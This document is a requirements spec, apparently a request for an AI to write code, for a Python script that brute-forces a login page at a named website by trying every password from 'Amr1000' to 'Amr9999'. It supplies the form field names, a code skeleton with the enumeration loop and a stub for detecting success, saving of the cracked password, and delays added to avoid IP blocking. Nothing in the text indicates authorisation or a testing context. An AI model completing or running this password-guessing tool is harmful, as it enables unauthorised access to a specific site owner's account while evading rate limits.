# Password Testing Script Requirements

## Overview
Create a Python script that automatically tests passwords on a login page until a successful login is found. The script should generate passwords following a specific pattern and test them systematically.

## Target Website Analysis
The target is a login page with the following characteristics:
- Single password input field
- Form-based authentication
- Page URL: "https://amr-elsherif.net/"

## Password Pattern
According to analysis, passwords follow this format:
- All passwords start with the word "Amr"
- Followed by a random number between 1000-9999
- Examples: "Amr2345", "Amr9387", etc.

## Technical Requirements

### Script Functionality
1. Generate passwords in the specified format (Amr + number between 1000-9999)
2. Submit each password to the login form
3. Detect successful/failed login attempts
4. Continue until a successful login is found or all possibilities are exhausted
5. Display progress during execution
6. Save successful password when found

### HTTP Information
The script should handle the following HTTP characteristics:
- Server: Cloudflare
- Content-Type: text/html
- Connection: keep-alive
- CF-RAY: 92a035806690edaf-MXP
- Potential redirection to https://amr-elsherif.net/

### Libraries to Use
1. `requests` - For handling HTTP requests
2. `BeautifulSoup` - For parsing HTML responses
3. `time` - For adding delays between requests

## Example Implementation Structure

```python
import requests
from bs4 import BeautifulSoup
import time
import random

def generate_password():
    """Generate password in format Amr + random 4-digit number"""
    number = random.randint(1000, 9999)
    return f"Amr{number}"

def test_password(password, url):
    """Test if password works on the login page"""
    # Implementation details...
    pass

def main():
    """Main function to control password testing process"""
    # URL of the login page
    login_url = "https://amr-elsherif.net/"
    
    # Track attempts
    attempts = 0
    start_time = time.time()
    
    # Test passwords from Amr1000 to Amr9999
    for number in range(1000, 10000):
        password = f"Amr{number}"
        attempts += 1
        
        # Display progress
        if attempts % 100 == 0:
            elapsed = time.time() - start_time
            print(f"Tested {attempts} passwords in {elapsed:.2f} seconds")
        
        # Test current password
        result = test_password(password, login_url)
        
        # If login successful, exit loop
        if result:
            print(f"SUCCESS! Password found: {password}")
            # Save password to file
            with open("found_password.txt", "w") as f:
                f.write(password)
            break
            
        # Add small delay to avoid overloading server
        time.sleep(0.1)

if __name__ == "__main__":
    main()
```

## Important Notes
1. The script should implement proper error handling
2. Add delays between requests to avoid server overload or IP blocking
3. Remember to update the login URL in the script

## Form Analysis from Provided HTML
- Form method: POST
- Password input name: "ps"
- Submit button name: "su"
- Submit button value: "Continue"

